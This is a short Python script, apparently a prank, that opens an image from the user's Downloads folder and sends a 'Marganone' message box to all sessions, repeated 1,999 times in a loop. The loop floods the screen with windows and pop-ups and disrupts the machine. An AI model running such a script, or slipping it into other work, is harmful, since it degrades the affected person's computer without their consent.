import getpass
import os

user = getpass.getuser()
image_path = fr"C:\Users\{user}\Downloads\marganine.png"

for i in range(1, 2000):
    os.startfile(image_path)
    os.system('msg * "Marganone"')
